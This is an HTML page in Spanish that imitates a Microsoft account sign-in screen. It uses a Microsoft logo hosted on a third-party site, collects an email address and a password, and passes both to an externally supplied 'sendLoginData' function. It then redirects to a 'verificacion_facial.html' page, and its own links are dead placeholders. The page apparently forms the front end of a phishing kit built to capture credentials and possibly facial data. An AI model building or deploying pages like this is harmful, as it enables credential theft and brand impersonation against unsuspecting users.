<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Iniciar sesión - Microsoft</title>
  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    html, body {
      height: 100%;
      background: linear-gradient(135deg, #f5f5f5 0%, #efefef 100%);
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 1000px;
      background: white;
      border-radius: 8px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
      display: grid;
      grid-template-columns: 1fr 1fr;
      overflow: hidden;
    }

    /* Left panel */
    .left-panel {
      background: linear-gradient(135deg, #0057A6 0%, #00A4EF 100%);
      padding: 60px 40px;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      min-height: 500px;
    }

    .left-panel::before {
      content: "";
      position: absolute;
      top: -50%;
      right: -50%;
      width: 400px;
      height: 400px;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 50%;
      z-index: 1;
    }

    .left-content {
      position: relative;
      z-index: 2;
      text-align: center;
    }

    .logo-img {
      max-width: 200px;
      height: auto;
      filter: brightness(1.1);
    }

    /* Right panel */
    .right-panel {
      padding: 60px 50px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .form-header {
      margin-bottom: 36px;
    }

    .form-title {
      font-size: 28px;
      font-weight: 600;
      color: #262626;
      margin-bottom: 8px;
      letter-spacing: -0.5px;
    }

    .form-subtitle {
      font-size: 14px;
      color: #666;
      font-weight: 400;
    }

    .input-group {
      margin-bottom: 20px;
    }

    .input-label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #262626;
      font-size: 13px;
    }

    .input-wrapper {
      position: relative;
    }

    .input-icon {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      color: #999;
      font-size: 18px;
      pointer-events: none;
      transition: color 0.2s ease;
    }

    .input-field {
      width: 100%;
      padding: 12px 12px 12px 40px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
      transition: all 0.2s ease;
      background: white;
      color: #262626;
    }

    .input-field::placeholder {
      color: #999;
    }

    .input-field:focus {
      outline: none;
      border-color: #0078d4;
      box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
    }

    .input-field:focus ~ .input-icon {
      color: #0078d4;
    }

    .password-toggle {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #999;
      cursor: pointer;
      font-size: 18px;
      padding: 4px;
      transition: color 0.2s ease;
    }

    .password-toggle:hover {
      color: #0078d4;
    }

    .error-message {
      color: #d13438;
      font-size: 12px;
      margin-top: 6px;
      display: none;
    }

    .input-group.error .input-field {
      border-color: #d13438;
      background: #fff5f5;
    }

    .input-group.error .error-message {
      display: block;
    }

    .input-group.success .input-field {
      border-color: #107c10;
    }

    .btn-submit {
      width: 100%;
      padding: 12px 16px;
      background: linear-gradient(135deg, #0078d4 0%, #0063b1 100%);
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s ease;
      margin-bottom: 16px;
      position: relative;
      overflow: hidden;
      box-shadow: 0 2px 8px rgba(0, 120, 212, 0.2);
    }

    .btn-submit:hover:not(:disabled) {
      background: linear-gradient(135deg, #0063b1 0%, #004578 100%);
      box-shadow: 0 4px 12px rgba(0, 120, 212, 0.3);
      transform: translateY(-2px);
    }

    .btn-submit:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .btn-submit.loading {
      color: transparent;
    }

    .btn-submit.loading::after {
      content: "";
      position: absolute;
      width: 16px;
      height: 16px;
      top: 50%;
      left: 50%;
      margin: -8px 0 0 -8px;
      border: 3px solid transparent;
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .forgot-password {
      text-align: center;
      margin-bottom: 20px;
    }

    .forgot-password a {
      color: #0078d4;
      text-decoration: none;
      font-size: 13px;
      font-weight: 600;
    }

    .forgot-password a:hover {
      text-decoration: underline;
    }

    .separator {
      display: flex;
      align-items: center;
      margin: 24px 0;
      color: #e1dfdd;
    }

    .separator::before,
    .separator::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #e1dfdd;
    }

    .separator span {
      padding: 0 12px;
      color: #999;
      font-size: 13px;
    }

    .signup-section {
      text-align: center;
      font-size: 13px;
      color: #666;
      margin-bottom: 20px;
    }

    .signup-section a {
      color: #0078d4;
      text-decoration: none;
      font-weight: 600;
    }

    .signup-section a:hover {
      text-decoration: underline;
    }

    .footer-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      padding-top: 20px;
      border-top: 1px solid #e1dfdd;
      margin-top: 20px;
    }

    .footer-links a {
      color: #666;
      text-decoration: none;
      font-size: 12px;
    }

    .footer-links a:hover {
      color: #0078d4;
    }

    /* Responsive */
    @media (max-width: 1200px) {
      .right-panel {
        padding: 40px 35px;
      }

      .left-panel {
        padding: 40px 30px;
      }

      .form-title {
        font-size: 24px;
      }

      .logo-img {
        max-width: 160px;
      }
    }

    @media (max-width: 900px) {
      .container {
        grid-template-columns: 1fr;
      }

      .left-panel {
        padding: 40px;
        min-height: 220px;
      }

      .right-panel {
        padding: 40px;
      }

      .form-title {
        font-size: 22px;
      }

      .logo-img {
        max-width: 140px;
      }

      .footer-links {
        flex-direction: column;
        gap: 12px;
        align-items: center;
      }
    }

    @media (max-width: 600px) {
      body {
        padding: 10px;
      }

      .container {
        border-radius: 0;
      }

      .left-panel {
        padding: 30px 20px;
        min-height: 180px;
      }

      .right-panel {
        padding: 30px 20px;
      }

      .form-header {
        margin-bottom: 24px;
      }

      .form-title {
        font-size: 20px;
      }

      .form-subtitle {
        font-size: 12px;
      }

      .logo-img {
        max-width: 100px;
      }

      .input-field {
        font-size: 14px;
        padding: 10px 10px 10px 36px;
      }

      .input-icon {
        font-size: 16px;
        left: 10px;
      }

      .password-toggle {
        font-size: 16px;
        right: 10px;
      }

      .footer-links {
        margin-top: 16px;
        padding-top: 16px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Left Panel -->
    <div class="left-panel">
      <div class="left-content">
        <img src="https://www.insights.la/wp-content/uploads/2015/04/Microsoft-logo-m-box-880x660.png" alt="Microsoft" class="logo-img">
      </div>
    </div>

    <!-- Right Panel -->
    <div class="right-panel">
      <div class="form-header">
        <h1 class="form-title">Iniciar sesión</h1>
        <p class="form-subtitle">Usa tu cuenta de Microsoft</p>
      </div>

      <form id="loginForm">
        <!-- Email Input -->
        <div class="input-group" id="emailGroup">
          <label class="input-label" for="email">Correo electrónico, teléfono o Skype</label>
          <div class="input-wrapper">
            <input 
              type="email" 
              id="email" 
              name="email" 
              class="input-field" 
              placeholder="usuario@ejemplo.com"
              required
            >
            <i class="ri-user-3-line input-icon"></i>
            <div class="error-message" id="emailError"></div>
          </div>
        </div>

        <!-- Password Input -->
        <div class="input-group" id="passwordGroup">
          <label class="input-label" for="password">Contraseña</label>
          <div class="input-wrapper">
            <input 
              type="password" 
              id="password" 
              name="password" 
              class="input-field" 
              placeholder="Introduce tu contraseña"
              required
            >
            <i class="ri-lock-2-line input-icon"></i>
            <button type="button" class="password-toggle" id="togglePassword">
              <i class="ri-eye-off-line"></i>
            </button>
            <div class="error-message" id="passwordError"></div>
          </div>
        </div>

        <!-- Submit Button -->
        <button type="submit" class="btn-submit" id="submitBtn">Siguiente</button>

        <!-- Forgot Password -->
        <div class="forgot-password">
          <a href="#">¿Has olvidado tu contraseña?</a>
        </div>

        <!-- Separator -->
        <div class="separator">
          <span>o</span>
        </div>

        <!-- Sign Up -->
        <div class="signup-section">
          ¿No tienes una cuenta? <a href="#">Crear una cuenta</a>
        </div>
      </form>

      <!-- Footer Links -->
      <div class="footer-links">
        <a href="#">Condiciones de uso</a>
        <a href="#">Privacidad y cookies</a>
        <a href="#">Ayuda</a>
      </div>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const form = document.getElementById('loginForm');
      const emailInput = document.getElementById('email');
      const passwordInput = document.getElementById('password');
      const togglePassword = document.getElementById('togglePassword');
      const emailGroup = document.getElementById('emailGroup');
      const passwordGroup = document.getElementById('passwordGroup');
      const submitBtn = document.getElementById('submitBtn');

      function validateEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
      }

      togglePassword.addEventListener('click', function(e) {
        e.preventDefault();
        const type = passwordInput.type === 'password' ? 'text' : 'password';
        passwordInput.type = type;
        this.querySelector('i').className = type === 'password' ? 'ri-eye-off-line' : 'ri-eye-line';
      });

      emailInput.addEventListener('input', function() {
        if (this.value) {
          if (validateEmail(this.value)) {
            emailGroup.classList.remove('error');
            emailGroup.classList.add('success');
          } else {
            emailGroup.classList.remove('success');
            emailGroup.classList.add('error');
            document.getElementById('emailError').textContent = 'Email inválido';
          }
        } else {
          emailGroup.classList.remove('error', 'success');
        }
      });

      passwordInput.addEventListener('input', function() {
        if (this.value) {
          passwordGroup.classList.remove('error');
          passwordGroup.classList.add('success');
        } else {
          passwordGroup.classList.remove('error', 'success');
        }
      });

      form.addEventListener('submit', async function(e) {
        e.preventDefault();

        let valid = true;

        if (!emailInput.value || !validateEmail(emailInput.value)) {
          emailGroup.classList.add('error');
          document.getElementById('emailError').textContent = 'Email requerido y válido';
          valid = false;
        } else {
          emailGroup.classList.remove('error');
        }

        if (!passwordInput.value) {
          passwordGroup.classList.add('error');
          document.getElementById('passwordError').textContent = 'Contraseña requerida';
          valid = false;
        } else {
          passwordGroup.classList.remove('error');
        }

        if (!valid) return;

        submitBtn.disabled = true;
        submitBtn.classList.add('loading');

        try {
          await new Promise(r => setTimeout(r, 1500));
          if (typeof sendLoginData === 'function') {
            await sendLoginData(emailInput.value, passwordInput.value);
          }
          window.location.href = 'verificacion_facial.html';
        } catch (error) {
          submitBtn.disabled = false;
          submitBtn.classList.remove('loading');
          alert('Error al iniciar sesión');
        }
      });

      emailInput.focus();
    });
  </script>
</body>
</html>
